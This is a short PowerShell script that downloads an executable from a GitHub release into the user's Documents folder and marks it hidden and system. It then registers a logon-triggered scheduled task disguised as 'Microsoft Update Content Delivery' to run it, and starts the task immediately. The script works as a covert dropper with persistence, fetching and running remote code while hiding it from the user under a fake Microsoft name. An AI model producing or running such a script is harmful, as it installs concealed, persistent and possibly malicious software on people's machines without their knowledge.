Clear-Host

$downloadUrl = "https://github.com/sevcator/mango-mango-mango/releases/download/1/MANGO.exe"
$destinationPath = "$env:USERPROFILE\Documents\mango.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath

attrib +h +s $destinationPath

$taskName = "Microsoft Update Content Delivery"
$action = New-ScheduledTaskAction -Execute $destinationPath
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME

Start-ScheduledTask -TaskName $taskName

exit
